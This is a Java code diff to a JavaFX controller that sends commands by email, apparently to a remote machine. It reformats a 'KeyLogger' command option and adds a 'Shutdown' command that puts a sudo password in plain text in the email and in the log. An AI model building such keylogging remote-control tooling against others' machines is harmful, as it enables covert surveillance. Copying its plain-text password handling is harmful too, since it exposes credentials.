@@ -57,10 +57,15 @@ public class sendMailController {
                         addField.setEditable(false);
                         labelAddField.setText("Not Available");
                         sendBut.setDisable(false);
-                    }
-                    else if (t1.equals("KeyLogger")) {
+                    } else if (t1.equals("KeyLogger")) {
                         addField.setDisable(false);
                         labelAddField.setText("Time to log in milliseconds");
+                        sendBut.setDisable(false);
+                        addField.setEditable(true);
+                    }
+                    else if (t1.equals("Shutdown")) {
+                        addField.setDisable(false);
+                        labelAddField.setText("Your Password (Optional)");
                         sendBut.setDisable(false);
                         addField.setEditable(true);
                     }
@@ -152,11 +157,27 @@ public class sendMailController {
                     });
                     thread.start();
                 }
-
             }
             catch (NumberFormatException e) {
                 logText("Please enter an valid time!", "red");
             }
+        }
+        else if (choose.equals("Shutdown")) {
+            int id = random.nextInt(1000, 9999);
+            String sudopass = addField.getText();
+
+            sendBut.setDisable(true);
+            Thread thread = new Thread(() -> {
+                try {
+                    System.out.println(Thread.currentThread().getName());
+                    SendMail.getInstance().sendMail("req / " + id + " / " + "Shutdown/"+sudopass);
+                    logText("ID: " + id +"Password: "+sudopass+ " Send Mail Successfully! If there is a response, It means an error has occured!", "green");
+                } catch (IOException | MessagingException e) {
+                    logText(e.getMessage(), "red");
+                    e.printStackTrace();
+                }
+            });
+            thread.start();
         }
     }
 
